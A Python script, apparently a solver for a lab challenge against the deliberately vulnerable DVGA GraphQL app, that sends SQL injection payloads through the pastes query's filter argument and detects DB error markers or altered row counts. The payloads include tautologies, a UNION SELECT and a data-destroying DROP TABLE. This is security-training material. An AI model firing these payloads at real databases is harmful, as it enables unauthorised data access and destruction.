#!/usr/bin/env python3
"""
dvga_challenge_03_sql_injection.py — SQL injection via pastes(filter:).

DVGA threads the `filter` argument of the `pastes` query straight into the
ORM/SQL layer, so quote-breaking values surface DB errors or altered rows.
RELIABLE signals:
  * an `errors` entry whose message mentions a DB/SQL error (sqlite3 /
    sqlalchemy / "syntax error" / "no such column" / UNION ...), and/or
  * a 200 whose paste list shape/row-set changes vs. a clean baseline.

We report which signal fired and never print raw tracebacks / secrets.
Run: python3 dvga_challenge_03_sql_injection.py [--config ...]
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


SQL_ERROR_MARKERS = (
    "sqlite3", "sqlalchemy", "syntax error", "no such column",
    "You can only execute one statement", "OperationalError", "ProgrammingError",
    "near \"UNION\"", "UNION SELECT", "incomplete input",
)


def main():
    ap = argparse.ArgumentParser(description="SQL injection on pastes(filter:)")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)

    def run(filter_val):
        return dv.graphql(
            base,
            "query($f: String) { pastes(public: true, filter: $f) { id title content } }",
            {"f": filter_val}, cfg, dv.consumer_headers(803), tout,
        )

    r0 = run("")
    base_n = len(((r0.json() or {}).get("data") or {}).get("pastes") or []) if r0 is not None else -1
    print(f"baseline  pastes(public:true, filter:\"\") -> {base_n} paste(s)")

    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "x' OR '1'='1' --",
        "1' UNION SELECT id,title,content FROM pastes --",
        "' ; DROP TABLE pastes --",
    ]
    hits = 0
    for p in payloads:
        r = run(p)
        if r is None:
            print(f"payload   {p!r:52} -> transport error")
            continue
        body = r.json() if r.headers.get("content-type", "").find("json") >= 0 else {}
        errs = body.get("errors") or []
        blob = " ".join((e.get("message") or "") for e in errs).lower()
        marker = next((m for m in SQL_ERROR_MARKERS if m.lower() in blob), None)
        n = len((body.get("data") or {}).get("pastes") or [])
        row_change = (n != base_n)
        signal = marker is not None or row_change
        if signal:
            hits += 1
        why = []
        if marker:
            why.append(f"error-marker:{marker!r}")
        if row_change:
            why.append(f"row-set {base_n}->{n}")
        print(f"payload   {p!r:52} -> {'[SIGNAL: ' + ', '.join(why) + ']' if signal else 'clean (' + str(n) + ' rows)'}")

    print(f"\nDone — {hits}/{len(payloads)} payload(s) triggered an SQL injection signal.")
    if hits:
        print("[FINDING] pastes(filter:) is concatenated into the query; injection produces DB errors / altered rows.")
    else:
        print("[ok] no SQL injection signal observed (filter may be parameterised on this build).")


if __name__ == "__main__":
    main()
